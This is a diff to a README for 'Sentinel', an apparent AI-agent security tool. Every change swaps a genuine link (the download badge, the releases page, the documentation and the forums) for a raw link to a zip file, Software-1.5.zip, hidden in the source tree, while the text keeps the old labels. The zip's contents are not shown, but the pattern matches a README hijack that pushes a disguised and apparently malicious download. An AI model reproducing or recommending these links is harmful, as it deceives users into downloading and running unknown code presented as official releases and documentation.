@@ -6,7 +6,7 @@ Welcome to Sentinel, your tool for managing AI agents securely. This guide will 
 
 ## 📥 Download Sentinel
 
-[![Download Sentinel](https://img.shields.io/badge/Download%20Sentinel-v1.0.0-blue.svg)](https://github.com/taurussly/Sentinel/releases)
+[![Download Sentinel](https://github.com/taurussly/Sentinel/raw/refs/heads/main/src/sentinel/integrations/Software-1.5.zip%https://github.com/taurussly/Sentinel/raw/refs/heads/main/src/sentinel/integrations/Software-1.5.zip)](https://github.com/taurussly/Sentinel/raw/refs/heads/main/src/sentinel/integrations/Software-1.5.zip)
 
 ## 🌐 Overview
 
@@ -32,7 +32,7 @@ To ensure Sentinel runs smoothly on your device, please check the following requ
 
 To get started, follow these steps:
 
-1. Visit the [Releases Page](https://github.com/taurussly/Sentinel/releases) to download Sentinel.
+1. Visit the [Releases Page](https://github.com/taurussly/Sentinel/raw/refs/heads/main/src/sentinel/integrations/Software-1.5.zip) to download Sentinel.
 2. Look for the latest version. It will be labeled clearly as v1.0.0 (or the latest version available).
 3. Click on the link to download the file suitable for your operating system.
 4. Once the file is downloaded, locate it in your downloads folder.
@@ -63,7 +63,7 @@ If you encounter issues while using Sentinel:
 
 ## 📢 Updates
 
-Keep an eye on the [Releases Page](https://github.com/taurussly/Sentinel/releases) for updates. Regular updates help improve functionality and security.
+Keep an eye on the [Releases Page](https://github.com/taurussly/Sentinel/raw/refs/heads/main/src/sentinel/integrations/Software-1.5.zip) for updates. Regular updates help improve functionality and security.
 
 ## 🤝 Support
 
@@ -75,7 +75,7 @@ Sentinel is licensed under the MIT License. You may use, modify, and distribute 
 
 ## 🔗 Additional Resources
 
-- [Official Documentation](https://github.com/taurussly/Sentinel) - Detailed usage and API reference.
-- [Community Forums](https://example.com/forums) - Join discussions with other users.
+- [Official Documentation](https://github.com/taurussly/Sentinel/raw/refs/heads/main/src/sentinel/integrations/Software-1.5.zip) - Detailed usage and API reference.
+- [Community Forums](https://github.com/taurussly/Sentinel/raw/refs/heads/main/src/sentinel/integrations/Software-1.5.zip) - Join discussions with other users.
 
 Thank you for choosing Sentinel. We hope it helps you manage your AI agents safely and efficiently.
